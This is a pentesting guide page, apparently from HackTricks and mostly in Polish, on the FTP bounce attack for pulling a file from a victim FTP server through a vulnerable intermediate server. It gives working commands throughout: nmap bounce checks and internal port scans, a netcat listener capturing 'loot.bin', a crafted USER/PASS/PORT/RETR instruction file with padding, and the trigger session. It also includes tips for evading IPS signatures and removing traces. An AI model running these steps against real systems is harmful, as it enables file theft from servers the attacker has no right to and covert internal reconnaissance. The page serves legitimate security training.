# FTP Bounce: pobranie pliku FTP (metoda 2)

{{#include ../../banners/hacktricks-training.md}}


## Podsumowanie

Jeśli masz dostęp do **bounce FTP server**, możesz sprawić, że zażąda on plików z **innego serwera FTP** (gdzie znasz jakieś poświadczenia) i pobrać ten plik na **własny serwer**.

## Wymagania

- Prawidłowe poświadczenia FTP na **FTP Middle server**
- Prawidłowe poświadczenia FTP na **Victim FTP server**
- Oba serwery **akceptują polecenie `PORT`** (bounce FTP attack)
- Możesz **zapisywać** w jakimś katalogu na **FTP Middle server**
- Serwer pośredni ma **większy dostęp** na **Victim FTP server** niż ty

## Kroki

1. Połącz się z **własnym serwerem FTP** i ustaw połączenie w tryb pasywny (`pasv` command), tak aby nasłuchiwał w katalogu, do którego usługa ofiary wyśle plik.
2. Sporządź plik, który FTP Middle server wyśle do Victim server (the **exploit script**). Plik ten będzie w formacie tekstowym i zawierać potrzebne polecenia do uwierzytelnienia się na Victim server, zmiany katalogu oraz pobrania pliku na twój serwer.
3. Połącz się z **FTP Middle Server** i prześlij wcześniej przygotowany plik.
4. Spraw, aby FTP Middle server **nawiązał połączenie** z Victim server i wysłał exploit file.
5. **Przechwyć** plik na własnym serwerze FTP.
6. **Usuń** exploit file z FTP Middle server.

## Szybkie sprawdzenie podatnych bounce hosts

- **Nmap** wciąż obsługuje FTP bounce checks. Przykład weryfikacji potencjalnego serwera pośredniego:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
If the server refuses third‑party `PORT` values the scan will fail; some **embedded/legacy printers, NAS and appliance FTP daemons** still allow it.

## Automating the 2nd FTP download

Below is a modernized way to pull a file through a vulnerable middle FTP server.

1. **Otwórz pasywny listener** na swojej maszynie atakującej (dowolny TCP sink działa):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Zanotuj** swój adres IP jako `A,B,C,D` i port `P` jako `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Zbuduj plik instrukcji** który serwer pośredniczący odtworzy dla ofiary:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Wyślij & wyzwól z serwera pośredniczącego** (classic proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Zgarnij plik** z listenera (`loot.bin`).
6. **Posprzątaj** przesłany plik `instrs` na serwerze pośredniczącym.

Notes:
- Dopełnienie (padding) (`dd ...`) zapobiega zamknięciu połączenia kontrolnego zanim RETR się zakończy (problem z dużym oknem TCP omawiany w klasycznych writeupach).
- Any service that can **listen and dump TCP** can replace the FTP PASV socket (e.g., `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Jeśli serwer pośredniczący ogranicza porty uprzywilejowane, użyj wysokiego portu w `PORT` i dostosuj swój listener odpowiednio.

## Extra tricks

- Use a bounceable FTP server to **port-scan internal hosts** when file relay is blocked:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Some modern WAF/IDS (e.g., Juniper IPS) ship signatures specifically for **FTP:EXPLOIT:BOUNCE-ATTACK**; noisy payloads or missing padding may trip them.
- When the middle server enforces "PORT to same host" restrictions, place your **listener on the middle server itself** (if you have write/execute) and forward the captured file later.

For a more detailed old-school walkthrough check: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
